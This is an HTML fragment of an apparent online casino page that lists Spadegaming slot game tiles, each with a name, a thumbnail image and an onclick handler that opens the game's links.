                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mister cashmore" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mister cashmore', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/582cdc1cebc378752821025da7e02683.webp?v=0.1' , 'S-MC01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/582cdc1cebc378752821025da7e02683.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mister cashmore">Mister cashmore</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pirates Gold Rush" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pirates Gold Rush', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/41111786ff6f6b0cf11b1d32a82fa4e8.webp?v=0.1' , 'S-PG03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/41111786ff6f6b0cf11b1d32a82fa4e8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pirates Gold Rush">Pirates Gold Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legacy of Ramakien" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legacy of Ramakien', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/cae9a94a8b995a56d7b1158f16a6dd57.webp?v=0.1' , 'S-LR01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/cae9a94a8b995a56d7b1158f16a6dd57.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legacy of Ramakien">Legacy of Ramakien</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Alchemy Quest Jackpot" data-filter="ALL,NEW,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Alchemy Quest Jackpot', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/826da096dab278e5cb12ccd393a9876a.webp?v=0.1' , 'S-AL03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/826da096dab278e5cb12ccd393a9876a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Alchemy Quest Jackpot">Alchemy Quest Jackpot</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Secrets of Anubis" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Secrets of Anubis', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a8dc690997999b0ef76f602892d9406a.webp?v=0.1' , 'S-SA03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a8dc690997999b0ef76f602892d9406a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Secrets of Anubis">Secrets of Anubis</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fiery Sevens Hot 100" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fiery Sevens Hot 100', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/82da4233c928c12d99b1e6bb41ccede7.webp?v=0.1' , 'S-FH04', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/82da4233c928c12d99b1e6bb41ccede7.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fiery Sevens Hot 100">Fiery Sevens Hot 100</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fiery Sevens Hot 50" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fiery Sevens Hot 50', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/5602ea92c296f9a569615facf3ebb360.webp?v=0.1' , 'S-FH03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/5602ea92c296f9a569615facf3ebb360.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fiery Sevens Hot 50">Fiery Sevens Hot 50</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fiery Sevens Hot 20" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fiery Sevens Hot 20', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/75264bf22f2ee89b62fb0dc61b1d7564.webp?v=0.1' , 'S-FH02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/75264bf22f2ee89b62fb0dc61b1d7564.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fiery Sevens Hot 20">Fiery Sevens Hot 20</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fiery Sevens Hot 5" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fiery Sevens Hot 5', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a6afab2ee1e798f566a9f1c949f6ff5f.webp?v=0.1' , 'S-FH01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a6afab2ee1e798f566a9f1c949f6ff5f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fiery Sevens Hot 5">Fiery Sevens Hot 5</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruit Ninja Fury" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruit Ninja Fury', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/3e1e3a965f52a3e0830dd6ecdb87dd88.webp?v=0.1' , 'S-FN01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/3e1e3a965f52a3e0830dd6ecdb87dd88.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruit Ninja Fury">Fruit Ninja Fury</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hammer of Thunder" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hammer of Thunder', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/4d084ebacf25bd1af1d0333854e369fc.webp?v=0.1' , 'S-HT02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/4d084ebacf25bd1af1d0333854e369fc.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hammer of Thunder">Hammer of Thunder</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gemstone Rush" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gemstone Rush', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/bb3f2fb821a42348742f0be1c767808d.webp?v=0.1' , 'S-GR02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/bb3f2fb821a42348742f0be1c767808d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gemstone Rush">Gemstone Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Galaxy Guardian" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Galaxy Guardian', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/bf5cf1dc5035d8cf6f49d82687e0fd8a.webp?v=0.1' , 'S-GG02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/bf5cf1dc5035d8cf6f49d82687e0fd8a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Galaxy Guardian">Galaxy Guardian</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Moji Mania" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Moji Mania', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/2400fc068b4802416ecd13ae220aab7d.webp?v=0.1' , 'S-MM03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/2400fc068b4802416ecd13ae220aab7d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Moji Mania">Moji Mania</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Happy Neko" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Happy Neko', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/0a55c4f9b0afdb2dca4a5d63f41ed7ab.webp?v=0.1' , 'S-HN01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/0a55c4f9b0afdb2dca4a5d63f41ed7ab.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Happy Neko">Happy Neko</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold West" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold West', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/bab2a42a14266295d3abb425d1ec150f.webp?v=0.1' , 'S-GW03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/bab2a42a14266295d3abb425d1ec150f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold West">Gold West</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Twin Sea" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Twin Sea', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/95e4215a836810f304210ff423997158.webp?v=0.1' , 'S-LT01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/95e4215a836810f304210ff423997158.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Twin Sea">Lucky Twin Sea</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Pop 2" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Pop 2', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/f9b0d84dcb1e2c0e587b5e4318d4375f.webp?v=0.1' , 'S-CP03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/f9b0d84dcb1e2c0e587b5e4318d4375f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Pop 2">Candy Pop 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rabbit Riches" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rabbit Riches', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/49b0252edd8f7f81ecd4027236216884.webp?v=0.1' , 'S-RR01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/49b0252edd8f7f81ecd4027236216884.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rabbit Riches">Rabbit Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Christmas Miracles" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Christmas Miracles', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/90eaab6206d2ad8da2d85c5886599552.webp?v=0.1' , 'S-CM02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/90eaab6206d2ad8da2d85c5886599552.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Christmas Miracles">Christmas Miracles</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Panda Opera" data-filter="ALL,NEW,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Panda Opera', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a1578cd852c2f1de9c71cdf361e20014.webp?v=0.1' , 'S-PO02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a1578cd852c2f1de9c71cdf361e20014.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Panda Opera">Panda Opera</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Halloween Vacation" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Halloween Vacation', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/1dc31fbac74d4eae6070ec089498603a.webp?v=0.1' , 'S-HV01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/1dc31fbac74d4eae6070ec089498603a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Halloween Vacation">Halloween Vacation</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Party" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Party', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/67f0ac98b3bf72dc2099af8d31ade968.webp?v=0.1' , 'S-SP04', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/67f0ac98b3bf72dc2099af8d31ade968.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Party">Sugar Party</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Space Conquest" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Space Conquest', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/5dd3bb1b4ea78a6ebd66256b23170c20.webp?v=0.1' , 'S-SC01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/5dd3bb1b4ea78a6ebd66256b23170c20.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Space Conquest">Space Conquest</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jokers Treasure Exclusive" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jokers Treasure Exclusive', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/046aad4dbbd1af71ed18ff1abe493402.webp?v=0.1' , 'S-JT03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/046aad4dbbd1af71ed18ff1abe493402.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jokers Treasure Exclusive">Jokers Treasure Exclusive</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Koi Exclusive" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Koi Exclusive', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/55398ac7728c38b341b80d51ef345735.webp?v=0.1' , 'S-LK02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/55398ac7728c38b341b80d51ef345735.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Koi Exclusive">Lucky Koi Exclusive</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Roma" data-filter="ALL,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Roma', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a3b38a186ab8a41e3ce1b2bebb461107.webp?v=0.1' , 'S-RM01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a3b38a186ab8a41e3ce1b2bebb461107.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Roma">Roma</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Candy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Candy', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/d8d749a456877254df51dad8d3696d1f.webp?v=0.1' , 'S-CP02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/d8d749a456877254df51dad8d3696d1f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Candy">Candy Candy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Bonanza" data-filter="ALL,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Bonanza', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e6c681e92611cee45cc61c8368b44e57.webp?v=0.1' , 'S-CB02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e6c681e92611cee45cc61c8368b44e57.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Bonanza">Sugar Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Magic Kitty" data-filter="ALL,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Magic Kitty', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/4856381beb349b6967020ff5d4063952.webp?v=0.1' , 'S-MK01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/4856381beb349b6967020ff5d4063952.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Magic Kitty">Magic Kitty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hugon Quest" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hugon Quest', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/174062d928ca24723923ba43e756aede.webp?v=0.1' , 'S-HQ01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/174062d928ca24723923ba43e756aede.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hugon Quest">Hugon Quest</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legendary Beasts Saga" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legendary Beasts Saga', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/eb601bb5411c14a0009ee050ca0d9d93.webp?v=0.1' , 'S-LB01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/eb601bb5411c14a0009ee050ca0d9d93.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legendary Beasts Saga">Legendary Beasts Saga</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Love Idol" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Love Idol', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a4bbfc00b1f2dcf65ed45778a05c9ffd.webp?v=0.1' , 'S-LI03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a4bbfc00b1f2dcf65ed45778a05c9ffd.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Love Idol">Love Idol</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mayan Gems" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mayan Gems', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/df61eac9564a9f5217a70fddb95ac6a6.webp?v=0.1' , 'S-MG02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/df61eac9564a9f5217a70fddb95ac6a6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mayan Gems">Mayan Gems</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crazy Bomber" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crazy Bomber', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/c151879d7a7107ace1a6e3c7533127c6.webp?v=0.1' , 'S-CB01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/c151879d7a7107ace1a6e3c7533127c6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crazy Bomber">Crazy Bomber</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise Of Werewolves" data-filter="ALL,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise Of Werewolves', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/1bc5c777a465dce25a54377f5bedd99c.webp?v=0.1' , 'S-RW01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/1bc5c777a465dce25a54377f5bedd99c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise Of Werewolves">Rise Of Werewolves</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Empire" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Empire', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/1656fdcfdba0d6f7876cef5224dba1be.webp?v=0.1' , 'S-DE01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/1656fdcfdba0d6f7876cef5224dba1be.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Empire">Dragon Empire</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Myth" data-filter="ALL,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Myth', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e51ae5a4474871bd19b4f34d772122df.webp?v=0.1' , 'S-BM01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e51ae5a4474871bd19b4f34d772122df.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Myth">Book of Myth</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Double Flame" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Double Flame', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/b25342672df364e4a71669be4cad90cc.webp?v=0.2' , 'S-DF03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/b25342672df364e4a71669be4cad90cc.webp?v=0.2" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Double Flame">Double Flame</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="888" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '888', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/b0bf713e8e56c2ebbf5a2e19dc8eb4f1.webp?v=0.1' , 'S-BA01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/b0bf713e8e56c2ebbf5a2e19dc8eb4f1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="888">888</h5>
        </a>
        
     
